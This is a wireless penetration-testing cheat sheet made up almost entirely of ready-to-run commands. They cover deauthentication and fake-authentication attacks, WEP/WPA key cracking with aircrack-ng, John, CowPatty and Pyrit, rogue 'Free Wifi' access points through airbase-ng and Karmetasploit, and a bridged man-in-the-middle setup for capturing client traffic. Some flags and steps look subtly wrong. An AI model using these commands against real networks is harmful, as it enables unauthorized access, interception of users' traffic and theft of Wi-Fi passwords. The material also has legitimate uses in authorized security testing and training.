# Wireless

## TBD - more to come here

## Wireless Basics

See a list of SSIDs in proximity:

```text
iw dev wlan0 scan |grep SSID
```

Find out what channel the SSIDs are operating on:

```text
iw dev wlan0 scan|egrep "DS\ Parameter\ set|SSID"
```

Create a monitor mode interface and bring it up:

```text
iw dev wlan0 interface add mon0 type monitor
ifconfig mon0 up
```

See a list of available frequencies:

```text
iwlist wlan0 frequency
```

Check status and/or listing wireless interfaces

```text
airmon-ng
```

Checking for interfering processes

```text
airmon-ng check
```

Killing interfering processes

```text
airmon-ng check kill
```

Enable and stop monitor mode

```text
airmon-ng start wlan0
airmon-ng stop wlan0
```

Start on a specific interface:

```text
airmon-ng start wlan0 3
```

## Aircrack-ng Basics

Monitor Mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

Airodump Caputure of Traffic:

```text
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> mon0
```

Fake Authentication Attack on AP:

```text
aireplay-ng -1 0 -e <AP ESSID> -a <MAC Address of AP> -h <MON MAC Address> mon0
```

Deauthentication Attack against connected client:

```text
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> mon0
```

Crack WEP Key:

```text
aircrack-ng -0 <filename>
```

## Monitor Mode

Put interface in to monitor mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

Capture Data on Multiple Wireless Bands

```text
airodump-ng --band abg mon0
```

Airodump Caputure of Traffic:

```text
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> mon0
```

Fake Authentication Attack on AP:

```text
aireplay-ng -1 0 -e <AP ESSID> -a <MAC Address of AP> -h <MON MAC Address> mon0
```

Interactive Aireplay Attack:

```text
aireplay-ng -2 -b <AP MAC> -d FF:FF:FF:FF:FF:FF -f 1 -m 68 -n 86 mon0
```

Once Injecting Packet with Success, ran aircrack-ng \(PTW Attack -z\):

```text
aircrack-ng -0 -z -n 64 <filename>
```

## Wireless AP Attacks when there are no clients

Monitor Mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

Airodump Caputure of Traffic:

```text
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> mon0
```

Fake Authentication Attack on AP:

```text
aireplay-ng -1 0 -e <AP ESSID> -a <MAC Address of AP> -h <MON MAC Address> mon0
```

Fragmentation Attack:

```text
aireplay-ng -5 -b <AP MAC> -h <Mon MAC Address> mon0
```

After obtaining a PRGA packet, we conduct a ARP Attack with Packetforge:

```text
packetforge-ng -0 -a <AP MAC> -h <Mon MAC Address> -l <Source IP> -k <Dest IP> -y  <xor filename> -w <packet filename>
```

Interactive Packet Replay Attack:

```text
aireplay-ng -2 -r <packet-filename> mon0
```

Once we see injection is a success, crack pass:

```text
aircrack-ng -0 <filename>
```

## Launch Wireless MiTM with Aircrack

Monitor Mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

De-Auth Client:

```text
aireplay-ng --deauth -5 -a <AP MAC>
```

Fake Authentication Attack on AP:

```text
aireplay-ng -1 0 -e <AP ESSID> -a <MAC Address of AP> -h <MON MAC Address> mon0
```

## Crack WPA-PSK

Monitor Mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

Airodump Capture of Traffic:

```text
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> mon0
```

De-Auth Client:

```text
aireplay-ng --deauth -11 -a <AP MAC>
```

Crack Password:

```text
aircrack-ng -a 2 -w capture
```

## Fake Shared Key Authentication Attack

Monitor Mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

Airodump Capture of Traffic:

```text
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> mon0
```

PRGA Capture Deauthentication Attack against connected client:

```text
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> mon0
```

Shared Key Fake Auth with PRGA File:

```text
aireplay-ng -1 60 -e <AP ESSID> -y <PRGA Filename> -a <AP MAC> -h <OurMAC> mon0
```

ARP Request Replay Attack:

```text
aireplay-ng -3 -b <AP MAC> -h <Our MAC> mon0
```

Deauthentication Attack against connected client - speed up process:

```text
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> mon0
```

Crack Password:

```text
aircrack-ng -0 -z -n 64 capture
```

## Cracking WPA with Aircrack-ng

Monitor Mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

Airodump Capture of Traffic:

```text
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> mon0
```

Deauthentication Attack against connected client:

```text
aireplay-ng -0 1 -a <AP MAC> -c <Client MAC> mon0
```

Crack Password:

```text
aircrack-ng -0 -w <wordlist> <capture filename>
```

## Airolib-ng Store and Manage ESSID and Password Lists and Compute their PMK for cracking WPA/WPA2

Place ESSID in to a text file:

```text
echo wifu > essid.txt
```

Import file in to airolib database:

```text
airolib-ng testdb --import essid essid.txt
```

Check Stats for Database:

```text
airolib-ng testdb --stats
```

Import Password list in to testdb:

```text
airolib-ng testdb --import passwd /path/to/pw/list
```

Have airolib-ng generate the PMK for us:

```text
airolib-ng testdb --batch
```

Check Stats for Database to confirm everything is ready:

```text
airolib-ng testdb --stats
```

Use database to crack passwords:

```text
aircrack-ng -r testdb <wpa-capture-filename>
```

## Cracking WPA with JtR

Monitor Mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

Airodump Capture of Traffic:

```text
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> mon0
```

Deauth Attack:

```text
aireplay-ng -0 1 -a $AP -c $VIC mon0
```

Utilize John to Crack Password:

```text
cd /pentest/passwords/john
./john --wordlist=<path to wordlist> --rules --stdout|aircrack-ng -0 -e <AP ESSID> -w - <capture file>
```

## Cracking WPA with CowPatty

Monitor Mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

Airodump Capture of Traffic:

```text
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> mon0
```

Deauth Attack:

```text
aireplay-ng -0 1 -a $AP -c $VIC mon0
```

Run Cowpatty against the pcap to crack it \(also with aircrack-ng\):

```text
cowpatty -r <pcap> -f <path to wordlist> -2 -s <AP_SSID>

or

aircrack-ng -w <path to wordlist> -w <capture file>
```

Create WPA Hashes:

```text
genpmk -f <path to wordlist> -d <hash list to create> -s <AP_SSID>
```

Run Cowpatty using hashes - rainbow table method:

```text
cowpatty -r <pcap> -d <hash list> -2 -s <AP_SSID>
```

## Cracking WPA with Pyrit:

Monitor Mode:

```text
airmon-ng start wlan0 <AP Channel Number>
```

Airodump Capture of Traffic:

```text
airodump-ng -c <AP Channel> --bssid <AP MAC> -w <filename> mon0
```

Deauth Attack:

```text
aireplay-ng -0 1 -a $AP -c $VIC mon0
```

Run Pyrit in Dictionary Mode against pcap:

```text
pyrit -r <capture file> -i <wordlist> -b <AP_MAC> attack_passthrough
```

GPU Cracking:

```text
pyrit -i <wordlist> import_passwords
pyrit -e <AP_ESSID> create_essid
pyrit batch
pyrit -r <capture-file> attack_db
```

## Other Aircrack Tools:

Decrypt pcap and create new file with traffic

```text
airdecap-ng
```

Use to decrypt pcap and view traffic:

```text
airdecap-ng -e <SSID> -p <WPA-password> <pcap file name>
```

Airserv-ng - Create a listener

```text
Server:
airmon-ng start wlan0 3
airserv-ng -p 1337 -c 3  -d mon0

Client:
airodump-ng -c -3 --bssid $AP 192.168.1.12:1337
```

Airtun-ng as a WIDS \(Could then pass this traffic to snort or another monitor to see traffic and alarm on it.\)

```text
airtun-ng -a $AP -w <password> mon0
```

## Airbase-ng

Set up in AP Mode for devices to connect to:

```text
airmon-ng start wlan0 3
airbase-ng -c 3 -e <SSID You want to Broadcast> mon0
```

Setup Airbase and crack password when people complete handshake with it:

```text
airodump-ng -c <AP Channel> -d $MON -w airbase mon0
airbase-ng -c 3 -e <SSID You want to Broadcast> -z 4 -W 1  mon0
aircrack-ng -w <password list> <pcap>
```

## Karmetasploit:

[https://www.offensive-security.com/metasploit-unleashed/karmetasploit/](https://www.offensive-security.com/metasploit-unleashed/karmetasploit/)

1. Install DHCP server: apt-get install dhcp3-server
2. Place interface in monitor mode: airmon-ng start wlan0 3
3. Serve up malicious AP: airbase-ng -c 3 -P -C 60 -e "Free Wifi" -v mon0
4. Set up Interface: ifconfig at0 up 10.0.0.1/24

Setup DHCP Server: mkdir -p /var/run/dhcpd chown -R dhcpd:dhcpd /var/run/dhcpd touch /var/lib/dhcp3/dhcpd.leases cat dhcpd.conf cat dhcpd.conf &gt; /tmp/dhcpd.conf touch /tmp/dhcp.log chown dhcpd:dhcpd /tmp/dhcp.log dhcpd3 -f -cf /tmp/dhcpd.conf -pf /var/run/dhcpd/pid -lf /tmpdhcp.log at0

Download Karmetasploit: wget [https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc\_.txt](https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt) msfconsole -r 

## MiTM Wireless

Place interface in monitor mode and set up AP: airmon-ng start wlan0 3 airbase-ng -c 3 -e  mon0

Create bridged interface: brctl addbr hacker brctl addif hacker eth0 brctl addif hacker at0 ifconfig eth0 0.0.0.0 up ifconfig at0 0.0.0.0 up ifconfig hacker 192.168.1.8 up

Enable ip forwarding: echo 1 &gt; /proc/sys/net/ipv4/ip\_forward

Next launch Ettercap in unified mode and capture traffic on the hacker interface.

